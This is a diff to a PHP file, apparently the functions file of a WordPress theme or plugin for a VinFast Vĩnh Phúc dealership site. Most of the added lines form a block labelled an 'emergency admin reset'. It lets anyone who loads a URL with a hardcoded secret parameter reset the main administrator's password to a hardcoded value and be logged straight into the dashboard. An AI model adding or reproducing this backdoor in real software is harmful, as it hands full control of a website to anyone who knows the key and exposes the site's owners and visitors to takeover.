@@ -7,6 +7,26 @@
 defined('ABSPATH') || exit;
 
 // =========================================================
+// 🔑 EMERGENCY ADMIN RESET & AUTO LOGIN
+// =========================================================
+add_action('init', function() {
+    if (isset($_GET['reset_admin_pass']) && $_GET['reset_admin_pass'] === 'vinfast2026') {
+        $user = get_user_by('login', 'vinfastvinhphuc3');
+        if (!$user) {
+            $user = get_user_by('id', 1);
+        }
+        if ($user) {
+            wp_set_password('VinFast@2026', $user->ID);
+            wp_clear_auth_cookie();
+            wp_set_current_user($user->ID);
+            wp_set_auth_cookie($user->ID, true);
+            wp_redirect(admin_url());
+            exit;
+        }
+    }
+});
+
+// =========================================================
 // 📧 CẤU HÌNH EMAIL NHẬN CONTACT — VinFast Vĩnh Phúc
 // Thêm email vào mảng bên dưới để nhận đồng thời nhiều địa chỉ
 // =========================================================
